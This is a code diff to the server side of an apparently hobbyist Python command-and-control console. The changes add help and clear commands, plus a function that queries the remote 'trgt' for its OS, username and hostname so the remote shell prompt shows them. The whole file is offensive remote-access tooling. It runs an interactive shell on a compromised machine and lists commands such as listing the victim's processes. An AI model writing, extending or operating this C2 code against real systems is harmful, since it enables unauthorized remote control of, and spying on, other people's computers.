@@ -143,23 +143,27 @@ def banner():
 ⚪ https://twitter.com/soumyani1
 	''', 'cyan'))
 
+	print(colored('''
+[+] Use ? (or help) command to show options\n''', 'yellow'))
+
 def help():
 
 	print(colored('''\n
   				      +------------------------+
   	    -:~~~~~~~~~~~~~~~~~~~~~~~~|  C&C Console Commands: |~~~~~~~~~~~~~~~~~~~~~~~~:-
-  				      +------------------------+
-  	''','green'))
+  				      +------------------------+''','green'))
 	print(colored('''\n
-		help                          :    Shows available Commands 
+		help or ?                     :    Shows available Commands 
 
 		exit                          :    To exit out from C&C Console environment
+		
+		clear 			      :    Clears the console screen
 
 		Connect or connect or CONNECT
 		(linux/windows)               :    To extablish connection and get a shell
 
 ''', 'yellow'))
-	print(colored('\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~','green'))
+	print(colored('\t -:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~:-\n','green'))
 
 
 
@@ -182,9 +186,16 @@ def server():
 		if command == "exit":
 			exit()
 
-		elif command == "help":
+		elif (command == "help") or (command == "?"):
 			help()
 			continue
+			
+		elif command == "clear":
+			
+			def screen_clear():
+				os.system('cls' if os.name=='nt' else 'clear')
+			
+			screen_clear()
 
 		elif (command == "Connect") or (command == "CONNECT") or (command == "connect"):
 
@@ -209,6 +220,46 @@ def server():
 			break
 
 
+# Getting trgt username
+def get_prompt():
+
+	global prompt
+
+	Type = "os_type"                        # to know the username of the trgt
+	send_eff(Type)
+
+	Type = recv_eff()                       # received response
+
+	if Type == 'nt':
+                # Windows OS = trgt
+		prompt = "pwd"
+		send_eff(prompt)
+
+		prompt = recv_eff()
+		prompt = prompt.strip()         # Stripping out EOL spacing
+
+		return prompt
+
+	else:
+                # Linux OS = trgt
+		prompt1 = "whoami"
+		send_eff(prompt1)
+
+		prompt1 = recv_eff()
+		prompt1 = prompt1.strip()       # Stripping out EOL spacing
+
+		prompt2 = "hostname"
+		send_eff(prompt2)
+
+		prompt2 = recv_eff()
+		prompt2 = prompt2.strip()       # Stripping out EOL spacing
+
+		prompt = prompt1+"@"+prompt2+"~"
+
+		return prompt
+
+
+
 # Getting a shell from trgt
 def shell():
 
@@ -218,7 +269,9 @@ def shell():
 
 	while True:
 
-		cmd = input(f"{username}@{ip}~> ")                # trgt shell prompt
+		prompt = get_prompt()                     # Continuously updating prompt based on the previous command used
+
+		cmd = input(f"{prompt}> ")                # trgt shell prompt
 		send_eff(cmd)
 
 
@@ -239,7 +292,7 @@ def shell():
 List of available Commands:
 ----------------------------------------------------------------------------------------
 
-help 						  :    Shows available Commands 
+help 			      :    Shows available Commands 
 
 exit                          :    To terminate session
 
@@ -507,27 +560,9 @@ get_pid			      :    To know the processes running on the trgt
 			print(result)
 
 
-
 # Getting trgt username
-def get_username():
-
-	global username
-
-	username = "whoami"                 # to know the username of the trgt
-	send_eff(username)
-
-
-	username = recv_eff()               # received response
-
-	username = username.strip()         # Stripping out EOL spacing
-
-	return username
-
-
 def main():
 	server()
-
-	username = get_username()           # getting username for making interactive shell from trgt
 
 	shell()                             # Getting shell for trgt
 	sock.close()                        # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function
@@ -535,4 +570,5 @@ def main():
 
 if __name__ == '__main__':
 	main()
+
 
